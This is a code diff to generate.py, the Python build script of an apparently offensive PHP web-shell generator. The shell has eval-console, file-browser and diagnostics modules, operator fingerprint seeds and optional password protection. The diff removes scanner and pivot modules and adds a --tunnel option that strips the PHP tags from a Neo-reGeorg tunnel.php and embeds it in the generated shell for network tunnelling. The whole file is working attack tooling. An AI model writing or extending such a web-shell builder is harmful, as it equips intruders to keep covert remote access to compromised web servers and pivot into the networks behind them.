@@ -7,7 +7,8 @@ Usage:
     python generate.py --lang php --minify                # Minified output
     python generate.py --seed "op-nighthawk"              # Operator-specific fingerprint
     python generate.py --password secret123               # Password-protected shell
-    python generate.py --exclude scanner,pivot            # Exclude modules
+    python generate.py --exclude tunnel,diagnostics       # Exclude modules
+    python generate.py --tunnel path/to/tunnel.php        # Embed Neo-reGeorg tunnel
     python generate.py --output myshell.php               # Custom filename
     python generate.py --verify dist/shell_a3f8c1e2.php   # Verify integrity
 """
@@ -28,18 +29,17 @@ CONFIG_PATH = os.path.join(SRC_DIR, 'config', 'defaults.json')
 
 # Module → file mapping
 MODULE_BACKEND = {
-    'scanner':     ['scanner.php', 'fingerprint.php'],
+    'tunnel':      ['tunnel.php'],
     'files':       ['filebrowser.php', 'fileops.php'],
     'diagnostics': ['diagnostics.php'],
     'console':     ['eval.php'],
 }
 
 MODULE_JS = {
-    'scanner':     ['scanner.js'],
+    'tunnel':      ['tunnel.js'],
     'files':       ['filebrowser.js'],
     'diagnostics': ['diagnostics.js'],
     'history':     ['history.js'],
-    'pivot':       ['pivotmap.js'],
     'console':     ['console.js'],
 }
 
@@ -226,6 +226,26 @@ def build(args):
         backend_parts.append(content)
     backend = '\n'.join(backend_parts)
 
+    # Neo-reGeorg tunnel injection
+    neoreg_tunnel = ''
+    if args.tunnel:
+        if 'tunnel' in exclude:
+            print("[!] Cannot use --tunnel with --exclude tunnel")
+            sys.exit(1)
+        tunnel_path = os.path.abspath(args.tunnel)
+        if not os.path.exists(tunnel_path):
+            print(f"[!] Tunnel file not found: {tunnel_path}")
+            sys.exit(1)
+        neoreg_code = read_file(tunnel_path)
+        # Strip opening <?php tag — we're embedding inside an existing PHP block
+        neoreg_code = re.sub(r'^<\?php\s*', '', neoreg_code.strip())
+        neoreg_code = re.sub(r'\?>\s*$', '', neoreg_code.strip())
+        neoreg_tunnel = neoreg_code
+        print(f"[*] Neo-reGeorg tunnel embedded from: {tunnel_path}")
+    elif 'tunnel' not in exclude:
+        print("[*] No --tunnel provided, tunnel tab will show setup instructions only")
+    backend = backend.replace('// {{NEOREG_TUNNEL}}', neoreg_tunnel)
+
     # Auth block
     auth_block = ''
     if args.password:
@@ -303,6 +323,7 @@ def build(args):
     print(f"    Size:      {file_size:,} bytes")
     print(f"    Excluded:  {excluded_str}")
     print(f"    Auth:      {'yes' if args.password else 'no'}")
+    print(f"    Tunnel:    {'embedded' if args.tunnel else 'not embedded'}")
     print(f"    Minified:  {'yes' if args.minify else 'no'}")
     if args.seed:
         print(f"    Seed:      {args.seed}")
@@ -327,8 +348,10 @@ def main():
                         help='Operator seed for unique fingerprinting')
     parser.add_argument('--password', default='',
                         help='Set password protection (hash is embedded)')
+    parser.add_argument('--tunnel', default='',
+                        help='Path to Neo-reGeorg generated tunnel.php (from neoreg.py -g)')
     parser.add_argument('--exclude', default='',
-                        help='Comma-separated modules to exclude (e.g. scanner,pivot)')
+                        help='Comma-separated modules to exclude (e.g. tunnel,diagnostics)')
     parser.add_argument('--output', default='',
                         help='Custom output filename')
     parser.add_argument('--verify', default='',
